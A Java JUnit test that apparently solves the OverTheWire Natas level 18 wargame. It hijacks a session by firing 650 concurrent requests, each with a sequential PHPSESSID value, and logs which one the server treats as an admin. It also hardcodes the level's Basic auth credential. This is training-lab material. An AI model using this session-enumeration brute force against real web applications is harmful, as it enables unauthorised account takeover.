import io.restassured.RestAssured;
import io.restassured.config.ConnectionConfig;
import io.restassured.response.Response;
import org.jsoup.Jsoup;
import org.jsoup.nodes.Document;
import org.junit.jupiter.api.Test;

import java.io.IOException;
import java.util.Arrays;
import java.util.HashMap;
import java.util.Map;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.TimeUnit;

public class Natas18 extends BaseClass {
    final String url = "http://natas18.natas.labs.overthewire.org/index.php";
    final String authToken = "Basic bmF0YXMxODo4TkVEVVV4ZzhrRmdQVjg0dUx3dlprR242b2tKUTZhcQ==";



    @Test
    public void getTimings() throws InterruptedException {
        RestAssured.config = RestAssured.config().connectionConfig(new ConnectionConfig().closeIdleConnectionsAfterEachResponseAfter(10, TimeUnit.SECONDS));
        int numberOfRequests = 650;
        ExecutorService executorService = Executors.newFixedThreadPool(numberOfRequests);


        Map<String, String> params = new HashMap<>();
        params.put("username", "admin");
        params.put("password", "secret");
        params.put("debug", "y");
        for (int i = 0; i < numberOfRequests; i++) {
            int finalI = i;
            executorService.submit(() -> {
                Response response = getRequestWithParamsAndCookie(url, authToken, params, "PHPSESSID", Integer.toString(finalI));
                Document doc = Jsoup.parse(response.getBody().asString());
                try {
                    writeTextToFile("src/test/resources/responses.txt", doc.select("#content").text() +
                            " " + response.getHeader("Date") + " " + response.getCookie("PHPSESSID"));
                } catch (IOException e) {
                    System.out.println("Something went wrong: " + Arrays.toString(e.getStackTrace()));
                }
            });
        }
        executorService.shutdown();
        executorService.awaitTermination(100, TimeUnit.SECONDS);
     }

    }

